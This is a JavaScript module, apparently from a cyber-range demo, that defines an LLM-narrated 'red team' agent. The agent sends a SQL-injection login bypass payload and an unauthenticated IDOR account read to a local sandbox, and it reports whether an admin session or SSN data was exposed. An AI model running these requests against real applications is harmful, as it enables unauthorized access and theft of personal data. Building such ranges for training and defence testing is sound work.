'use strict';
// RED TEAM — offensive agent. Performs real HTTP attacks against the
// sandbox and reports structured evidence. Reasoning narration is
// LLM-driven; the exploits themselves are deterministic real requests.
const { narrate } = require('./llm');

const SANDBOX = process.env.SANDBOX_URL || 'http://localhost:4000';

const RED_SYS =
  'You are RED TEAM, a persistent, adversarial ethical hacker in an ' +
  'autonomous cyber range. Speak in short, punchy operator lines (max 18 words).';

async function think(context) {
  return narrate({
    system: RED_SYS,
    user: context,
    fallback: context,
    maxTokens: 40,
  });
}

async function recon() {
  const res = await fetch(`${SANDBOX}/api/health`).then((r) => r.json()).catch(() => null);
  return {
    service: res?.service || 'unknown',
    endpoints: ['POST /api/login', 'GET /api/accounts/:id'],
  };
}

// Attempt SQL-injection auth bypass on the login endpoint.
async function exploitSQLi() {
  const payload = { username: "' OR 1=1 --", password: 'x' };
  const req = `POST /api/login  body=${JSON.stringify(payload)}`;
  const res = await fetch(`${SANDBOX}/api/login`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(payload),
  });
  const status = res.status;
  const body = await res.json().catch(() => ({}));
  const success = res.ok && body.ok && body.user && body.user.role === 'admin';
  return {
    vulnType: 'sqli',
    name: 'SQL Injection — Authentication Bypass',
    success,
    request: req,
    status,
    evidence: success
      ? `Bypassed login without credentials. Session issued as '${body.user.username}' (${body.user.role}), balance $${body.user.balance.toLocaleString()}.`
      : `Injection rejected (HTTP ${status}). Input treated as data, not SQL.`,
  };
}

// Attempt IDOR / broken-access-control read of another user's account.
async function exploitIDOR() {
  const req = 'GET /api/accounts/1   (no Authorization header)';
  const res = await fetch(`${SANDBOX}/api/accounts/1`);
  const status = res.status;
  const body = await res.json().catch(() => ({}));
  const success = !!(res.ok && body.ok && body.account);
  return {
    vulnType: 'idor',
    name: 'Broken Access Control — Account IDOR',
    success,
    request: req,
    status,
    evidence: success
      ? `Read admin account with no auth. SSN ${body.account.ssn}, balance $${body.account.balance.toLocaleString()} exposed.`
      : `Access denied (HTTP ${status}). Ownership/auth now enforced.`,
  };
}

module.exports = { think, recon, exploitSQLi, exploitIDOR, SANDBOX };
